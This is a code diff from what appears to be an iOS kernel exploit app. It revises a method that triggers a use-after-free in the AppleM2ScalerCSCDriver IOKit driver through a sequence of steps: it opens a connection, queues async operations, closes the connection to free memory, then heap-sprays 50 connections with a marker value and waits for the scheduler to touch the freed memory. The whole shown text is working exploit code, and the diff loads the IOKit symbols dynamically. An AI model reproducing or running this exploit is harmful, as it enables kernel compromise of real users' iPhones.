@@ -7840,12 +7840,17 @@ static void *iohid_threadCopyEvent(void *arg) {
 }
 
 - (void)runScalerUAF {
-    mach_port_t mp; IOMainPort(kIOMainPortDefault, &mp);
-    io_service_t svc = IOServiceGetMatchingService(mp, IOServiceMatching("AppleM2ScalerCSCDriver"));
+    if (!sIOServiceMatching || !sIOServiceGetMatchingService || !sIOServiceOpen
+        || !sIOServiceClose || !sIOObjectRelease || !sIOConnectCallMethod) {
+        [self appendLog:@"[FATAL] IOKit symbols not loaded"];
+        return;
+    }
+
+    mach_port_t mp = MACH_PORT_NULL;
+    io_service_t svc = sIOServiceGetMatchingService(mp, sIOServiceMatching("AppleM2ScalerCSCDriver"));
     if (!svc) {
         [self appendLog:@"[FATAL] AppleM2ScalerCSCDriver service NOT FOUND on this device"];
-        [self appendLog:@"This likely means the driver doesn't exist on A15 / iPhone 13"];
-        [self appendLog:@"(despite DarkSword working on A15, kext name may differ by SoC)"];
+        [self appendLog:@"A15 (iPhone 13) may not have this driver — kext name may differ"];
         return;
     }
     [self appendLog:@"[OK] AppleM2ScalerCSCDriver service found"];
@@ -7853,11 +7858,11 @@ static void *iohid_threadCopyEvent(void *arg) {
     // === STEP 1: Open victim connection ===
     [self appendLog:@"\n--- STEP 1: Open victim connection ---"];
     io_connect_t victim = IO_OBJECT_NULL;
-    IOReturn kr = IOServiceOpen(svc, mach_task_self(), 0, &victim);
+    IOReturn kr = sIOServiceOpen(svc, mach_task_self(), 0, &victim);
     [self appendLog:[NSString stringWithFormat:@"Victim conn: 0x%x (kr=0x%x)", victim, kr]];
     if (kr != 0 || !victim) {
         [self appendLog:@"[FAIL] Cannot open victim connection"];
-        IOObjectRelease(svc);
+        sIOObjectRelease(svc);
         return;
     }
 
@@ -7866,6 +7871,12 @@ static void *iohid_threadCopyEvent(void *arg) {
                          (id)kIOSurfaceBytesPerElement:@(4),(id)kIOSurfacePixelFormat:@(0x42475241)};
     IOSurfaceRef srcS = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
     IOSurfaceRef dstS = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
+    if (!srcS || !dstS) {
+        [self appendLog:@"[FAIL] Cannot create IOSurface"];
+        sIOServiceClose(victim);
+        sIOObjectRelease(svc);
+        return;
+    }
     uint32_t srcID = IOSurfaceGetID(srcS), dstID = IOSurfaceGetID(dstS);
     [self appendLog:[NSString stringWithFormat:@"IOSurface: src=%u dst=%u", srcID, dstID]];
 
@@ -7875,7 +7886,7 @@ static void *iohid_threadCopyEvent(void *arg) {
     *(uint32_t *)(baseline + 4) = dstID;
 
     // Sync baseline first
-    kr = IOConnectCallMethod(victim, 1, NULL, 0, baseline, TSD_SIZE, NULL, NULL, NULL, NULL);
+    kr = sIOConnectCallMethod(victim, 1, NULL, 0, baseline, TSD_SIZE, NULL, NULL, NULL, NULL);
     [self appendLog:[NSString stringWithFormat:@"Sync baseline (sel=1): kr=0x%x", kr]];
 
     // === STEP 2: Set credit marker and submit async ops ===
@@ -7884,7 +7895,7 @@ static void *iohid_threadCopyEvent(void *arg) {
         uint8_t s10[0x18]; memset(s10, 0, 0x18);
         *(uint32_t *)s10 = 0xDEAD0001;
         uint64_t sc[3] = {0,0,0};
-        kr = IOConnectCallMethod(victim, 10, sc, 3, s10, 0x18, NULL, NULL, NULL, NULL);
+        kr = sIOConnectCallMethod(victim, 10, sc, 3, s10, 0x18, NULL, NULL, NULL, NULL);
         [self appendLog:[NSString stringWithFormat:@"Sel 10 (credit=0xDEAD0001): kr=0x%x", kr]];
     }
 
@@ -7893,14 +7904,14 @@ static void *iohid_threadCopyEvent(void *arg) {
         uint8_t async_tsd[TSD_SIZE];
         memcpy(async_tsd, baseline, TSD_SIZE);
         *(uint64_t *)(async_tsd + 0x008) = 1;  // Async path
-        kr = IOConnectCallMethod(victim, 1, NULL, 0, async_tsd, TSD_SIZE, NULL, NULL, NULL, NULL);
+        kr = sIOConnectCallMethod(victim, 1, NULL, 0, async_tsd, TSD_SIZE, NULL, NULL, NULL, NULL);
         if (kr == 0) asyncOK++;
     }
     [self appendLog:[NSString stringWithFormat:@"Async ops: %d/50 OK", asyncOK]];
 
     // === STEP 3: Close victim connection ===
     [self appendLog:@"\n--- STEP 3: CLOSE victim (free per_client + ops) ---"];
-    kr = IOServiceClose(victim);
+    kr = sIOServiceClose(victim);
     [self appendLog:[NSString stringWithFormat:@"IOServiceClose: kr=0x%x", kr]];
     [self appendLog:@"Stale scheduler entries may still reference freed memory"];
 
@@ -7910,13 +7921,13 @@ static void *iohid_threadCopyEvent(void *arg) {
     int sprayOK = 0;
     for (int i = 0; i < 50; i++) {
         spray[i] = IO_OBJECT_NULL;
-        kr = IOServiceOpen(svc, mach_task_self(), 0, &spray[i]);
+        kr = sIOServiceOpen(svc, mach_task_self(), 0, &spray[i]);
         if (kr == 0 && spray[i]) {
             sprayOK++;
             uint8_t s10[0x18]; memset(s10, 0, 0x18);
             *(uint32_t *)s10 = 0xBEEF0002;
             uint64_t sc[3] = {0,0,0};
-            IOConnectCallMethod(spray[i], 10, sc, 3, s10, 0x18, NULL, NULL, NULL, NULL);
+            sIOConnectCallMethod(spray[i], 10, sc, 3, s10, 0x18, NULL, NULL, NULL, NULL);
         }
     }
     [self appendLog:[NSString stringWithFormat:@"Spray: %d/50 OK", sprayOK]];
@@ -7934,7 +7945,7 @@ static void *iohid_threadCopyEvent(void *arg) {
                 uint8_t async_tsd[TSD_SIZE];
                 memcpy(async_tsd, baseline, TSD_SIZE);
                 *(uint64_t *)(async_tsd + 0x008) = 1;
-                IOConnectCallMethod(spray[i], 1, NULL, 0, async_tsd, TSD_SIZE, NULL, NULL, NULL, NULL);
+                sIOConnectCallMethod(spray[i], 1, NULL, 0, async_tsd, TSD_SIZE, NULL, NULL, NULL, NULL);
             }
         }
         if (round % 10 == 0) {
@@ -7948,8 +7959,7 @@ static void *iohid_threadCopyEvent(void *arg) {
     [self appendLog:@"Then check panic log for x9 register value"];
     [self appendLog:@"x9=0xBEEF0002 → UAF confirmed (spray marker read)"];
 
-    IOObjectRelease(svc);
-    // Keep alive for delayed scheduler trigger
+    sIOObjectRelease(svc);
     while (1) { sleep(5); [self appendLog:@"  alive (waiting for scheduler trigger)..."]; }
 }
 
